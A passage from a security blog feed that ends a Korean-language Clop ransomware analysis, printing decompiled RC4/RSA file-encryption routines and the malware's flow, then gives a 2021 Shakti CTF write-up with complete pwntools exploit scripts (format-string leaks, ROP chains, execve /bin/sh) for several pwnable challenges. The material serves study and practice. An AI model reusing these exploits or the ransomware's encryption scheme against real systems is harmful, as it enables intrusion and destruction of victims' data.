class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v23, encrypted_key),</span><br><span class="line">      WriteFile(v21, (LPCVOID)v28, nNumberOfBytesToWrite, &amp;nNumberOfBytesToRead, <span class="number">0</span>))</span><br><span class="line">  &amp;&amp; v28 )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">  VirtualFree((LPVOID)v28, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>암호화에 쓰일 rc4_key를 만든 후 암호화 대상 파일의 이름과 같은 이름의 <code>.clip</code>확장자의 파일을 만든다. 그리고 <code>clip^_-</code>문자열과 rc4_key값을 encrypt_key함수를 통해 RSA로 암호화한 후 해당 파일에 적는다.  (rc4_key를 encrpyt하는 과정)</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">      CloseHandle(v21);</span><br><span class="line">    rc4_init((<span class="keyword">int</span>)rc4_key, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">    rc4_encrypt((<span class="keyword">char</span> *)lpBuffer, <span class="number">0x1F89D0</span>u, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">    UnmapViewOfFile(lpBuffer);</span><br><span class="line">    v4 = (<span class="keyword">void</span> (__stdcall *)(HANDLE))CloseHandle;</span><br><span class="line">    CloseHandle((HANDLE)lpBuffer);</span><br><span class="line">    CloseHandle((HANDLE)NumberOfBytesRead);</span><br><span class="line">    v24(rc4_key, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>만든 rc4_key를 가지고 <code>rc4_init</code>,<code>rc4_encrypt</code>함수를 호출하여 암호화 대상 파일을 암호화 한다. (파일을 encrypt하는 과정)</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;                                           <span class="comment">// 파일 크기가 2132432 보다 작거나 같을때 암호화 루틴</span></span><br><span class="line">  v6 = args-&gt;fileSize;</span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  SetFilePointer(v3, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  nNumberOfBytesToRead = v6 - <span class="number">0x4000</span>;</span><br><span class="line">  v7 = GlobalAlloc(<span class="number">0x40</span>u, v6 - <span class="number">0x4000</span>);</span><br><span class="line">  v29 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; ReadFile(v5, v7, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure><p>파일 크기가 2132432보다 작으면 메모리 mapping 방식이 아닌 read,write 방식을 사용하고, 나머지 encrypt 방식은 위와 동일하다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v8 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">  rc4_key_ = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      rc4_key_[v10++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">117</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !*rc4_key_ &amp;&amp; !rc4_key_[<span class="number">1</span>] &amp;&amp; !rc4_key_[<span class="number">2</span>] &amp;&amp; !rc4_key_[<span class="number">3</span>] &amp;&amp; !rc4_key_[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(rc4_key_, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">      v2 = v33;</span><br><span class="line">    &#125;</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    v11 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WriteFile(v11, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">      v12 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">      v13 = v2-&gt;hKey;</span><br><span class="line">      lpBuffer = v12;</span><br><span class="line">      encrypt_key(rc4_key_, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v13, (BYTE *)v12);</span><br><span class="line">      v14 = (<span class="keyword">void</span> *)lpBuffer;</span><br><span class="line">      <span class="keyword">if</span> ( WriteFile(v11, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          VirtualFree(v14, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      CloseHandle(v11);</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">  &#125;</span><br><span class="line">  rc4_init((<span class="keyword">int</span>)rc4_key_, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">  v15 = nNumberOfBytesToRead;</span><br><span class="line">  rc4_encrypt((<span class="keyword">char</span> *)v7, nNumberOfBytesToRead, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  SetFilePointer(hFile, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  WriteFile(v16, v29, v15, &amp;v28, <span class="number">0</span>);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2" alt="img"></p><p>encrypt하는 방식은 크기와 무관하지만, 범위는 다르다. 암호화 되는 범위는 위와 같다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png" alt="그림26"></p><p>파일을 암호화 한 뒤 해당 경로에 <code>README_README.txt</code>의 랜섬노트를 만드는 것을 확인할 수 있다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png" alt="그림25"></p><p>위와 같은 방법으로 암호화를 진행하며 <code>encrypt_thread</code> 함수는 여러 함수에서 호출된다. 이는 다양한 path에 대한 파일을 찾는 부분은 여러개지만 암호화에 사용되는 함수는 똑같음을 의미한다.</p><h1 id="Malicious-behavior"><a href="#Malicious-behavior" class="headerlink" title="Malicious behavior"></a>Malicious behavior</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><ol><li>악성코드 유포</li><li>악성코드 자가 삭제 batch 파일 생성, 루프 돌면서 끝날 때까지 체크</li><li>WinCheckDRVs 서비스로 악성코드 등록</li><li>모든 드라이브를 돌면서 암호화 대상 파일을 체크 및 암호화</li><li>암호화된 파일 경로에 암호화에 쓰인 rc4_key값을 rsa로 암호화 한 내용을 저장(.clip)</li><li>암호화된 파일 경로에 랜섬노트 생성</li></ol><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p><img src="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original" alt="img"></p><h1 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h1><p><img src="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png" alt="KakaoTalk_20210522_195528233"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=%ED%8B%B0%EC%98%A4%EB%A6%AC%ED%8B%B0%EB%B9%84TheoriTV">https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=티오리티비TheoriTV</a></li><li><a href="https://wogh8732.tistory.com/363?category=828183">https://wogh8732.tistory.com/363?category=828183</a></li><li><a href="https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26">https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Clop/">Clop</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Ransomware/">Ransomware</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 Shakti CTF</title>
      <link>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/</guid>
      <pubDate>Sun, 04 Apr 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 Shakti CTF Write-up &lt;/center&gt;

&lt;h1 id=&quot;Birdie-pwnable&quot;&gt;&lt;a href=&quot;#Birdie-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Birdie (pwnable)&quot;&gt;&lt;/a&gt;Birdie (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png&quot; alt=&quot;CTF1&quot;&gt;&lt;/p&gt;
&lt;p&gt;First, Check the protection. It is easy to find binary address because of NoPIE.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 Shakti CTF Write-up </center><h1 id="Birdie-pwnable"><a href="#Birdie-pwnable" class="headerlink" title="Birdie (pwnable)"></a>Birdie (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png" alt="CTF1"></p><p>First, Check the protection. It is easy to find binary address because of NoPIE.</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png" alt="CTF2"></p><p>When i analyzed it on IDA, i found that there are two vulnerabilities. The first one is <code>Format String Bug</code> on line 11. And the other is <code>Buffer Overflow</code> on line 13. </p><p><img src="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png" alt="CTF3"></p><p>So i could leak canary and libc addr using <code>Format String Bug</code>. And i could get <code>oneshot</code> because i knew the  libc address. </p><p>Let’s get the shell.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 1111)</span></span><br><span class="line">p = process(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007e2</span></span><br><span class="line">system = e.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x004008f3</span></span><br><span class="line">prsi = <span class="number">0x004008f1</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;name\n&#x27;</span>,<span class="string">&#x27;%15$p::%17$p::&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">libcbase = libc - <span class="number">0x21bf7</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(oneshot)</span><br><span class="line">p.sendafter(<span class="string">&#x27;payload\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Signal-dROPper-pwnable"><a href="#Signal-dROPper-pwnable" class="headerlink" title="Signal dROPper (pwnable)"></a>Signal dROPper (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png" alt="CTF4"></p><p>Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p><p><img src="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png" alt="CTF5"></p><p><code>0x6020c0</code> includes heap address, <code>0x602120</code> includes size of heap. It seems like you can allocate up to 12 buffers but not really. </p><p><img src="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png" alt="CTF6"></p><p>If i could overwrite read’s size (0x602120[v4]), the buffer overflow. </p><p><img src="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png" alt="CTF7"></p><p>So i allocated 13 heaps, then i could overwrite the size part (0x602128). lastly i could write on buffer 0x17c16f0 bytes!</p><p>It only remain to leak the libc addr and overwrite return address using ROP.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 2222)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">size = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x00400c03</span></span><br><span class="line">prsi = <span class="number">0x00400c01</span></span><br><span class="line">main = <span class="number">0x400b32</span></span><br><span class="line"></span><br><span class="line">put_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;to: &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">    vuln()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(put_got)</span><br><span class="line">payload += p64(put_plt)</span><br><span class="line">payload += p64(<span class="number">0x4008e7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase = leak - <span class="number">0x80aa0</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase  + <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Choice &gt; &#x27;,&#x27;3&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Returning-2-pwnable"><a href="#Returning-2-pwnable" class="headerlink" title="Returning-2 (pwnable)"></a>Returning-2 (pwnable)</h1><h2 id="vulnerability-2"><a href="#vulnerability-2" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png" alt="CTF8"></p><p>Check Protection,  No canary~</p><p><img src="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png" alt="CTF9"></p><p>It is Buffer overflow vulnerability. and also i could allocate dynamically on stack using <code>alloca</code> functions. </p><p><img src="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png" alt="CTF10"></p><p>I could find that i can make buffer address to read  <code>rsp</code>, when  the alloca’s size is <code>-30</code>.<br>Lastly I use ROP to exploit.</p><h2 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 3333)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601500</span></span><br><span class="line">push_rsp = e.symbols[<span class="string">&#x27;push_rsp&#x27;</span>]</span><br><span class="line">mov = <span class="number">0x0400774</span></span><br><span class="line">prax = <span class="number">0x040079a</span></span><br><span class="line">prdi = <span class="number">0x040077f</span></span><br><span class="line">prsi = <span class="number">0x0400791</span></span><br><span class="line">prdx = <span class="number">0x0400788</span></span><br><span class="line">syscall = <span class="number">0x04007a3</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(mov)</span><br><span class="line">payload += p64(prdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;text:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bye!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Cache-7-pwnable"><a href="#Cache-7-pwnable" class="headerlink" title="Cache_7 (pwnable)"></a>Cache_7 (pwnable)</h1><h2 id="vulnerability-3"><a href="#vulnerability-3" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png" alt="CTF11"></p><p>I can’t overwrite plt.got because it is FULL RELRO. I am gonna overwrite _hook address.</p><p>Let’s analyze the binary.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png" alt="123"></p><p>Allocate heap memory  here.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png" alt="456"></p><p>Free the memory here.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png" alt="789"></p><p>And can leak the memory using this.</p><p>You know, there is vulnerability about <code>Tcache double free</code> in Ubuntu 18.04 before patching.</p><p>And also they gave me the Libc file. It is Libc-2.27, and they gave hint . “Old Ubuntu 18.04”.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png" alt="1010"></p><p>I tested about it . First I allocated 0x40 size heap. and free the memory three times. The picture above shows that double free is possible.<br>There is no protection about <code>double free</code> in Ubuntu 18.04, but it is patched now.  </p><p>Then it is easy to exploit. I use this vulnerability i can leak the memory and also overwrite _hook address. </p><h2 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 